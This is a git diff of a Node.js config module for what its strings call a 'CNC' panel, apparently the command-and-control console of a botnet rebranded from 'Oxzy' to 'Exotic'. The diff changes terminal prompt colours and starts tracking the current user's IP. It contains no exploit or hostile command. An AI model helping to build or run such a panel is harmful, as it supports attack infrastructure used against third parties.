@@ -7,12 +7,12 @@ exports.hostname = function(name) {
     if(name === null || name === "undefined") {
         name = "CNC";
     }
-    return "\x1b[95m[\x1b[96mOxzy\x1b[95m@\x1b[96m" + name + "\x1b[95m]\x1b[96m#~ \x1b[95m";
+    return "\x1b[93m[\x1b[31mExotic\x1b[93m@\x1b[31m" + name + "\x1b[93m]\x1b[31m#~ \x1b[93m";
 }
 
 exports.Colors = {
     "Red": "\x1b[31m",
-    "Yellow": "\x1b[33m",
+    "Yellow": "\x1b[93m",
     "Blue": "\x1b[34m",
     "Purple": "\x1b[95m",
     "Green": "\x1b[32m",
@@ -37,7 +37,8 @@ exports.CNC_Info = {
 exports.CurrentCMD = {
     "Cmd": "",
     "arg": [],
-    "fullcmd": ""
+    "fullcmd": "",
+    "CurrentIP": ""
 }
 
 exports.CurrentUser = {
@@ -50,6 +51,7 @@ exports.CurrentUser = {
 }
 
 exports.GetCurrentUser = function(ip) {
+    config.CurrentCMD.CurrentIP = ip;
     if(crud.isSignedIn(ip)) {
         let get_user = crud.user(ip, "all");
         let info = get_user.split(",");
